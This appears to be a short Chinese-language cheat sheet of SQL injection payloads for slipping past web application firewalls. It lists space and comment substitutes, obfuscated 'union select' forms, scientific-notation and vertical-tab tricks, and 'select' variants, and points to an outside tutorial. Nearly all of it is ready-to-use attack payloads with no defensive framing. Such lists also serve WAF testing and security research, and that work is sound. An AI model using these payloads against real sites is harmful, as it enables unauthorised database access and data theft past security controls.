# sql_bypass_waf_fuzz

---

教程：

```
https://www.jianshu.com/p/dd7ba834170e?from=singlemessage
```



技巧

字母大小写转换


空格：

```
%0a
/**/
+
//
```

---

注释符

```
--
#
-- +
/**/
```

绕过union select

```
union/*!12345select*/user()
union/**/select user()
union(select user())
```

绕过空格union和空格from

```
科学计数法：
id=1.1union select 1,2,3.1from user;
id=1e0union select 1,2,3e0from user;
id=1e1union select 1,2,3e1from user;
%0b，%0c：
id=1%0bunion select 1,2,3  =》id=1^Kunion select 1,2,3
id=1%0cunion select 1,2,3  =》id=1^Lunion select 1,2,3
```

select xx绕过

```
select@user()
select~user()
select!user()
select%0buser() => select^Kuser()
select%0cuser() => select^Luser()
```

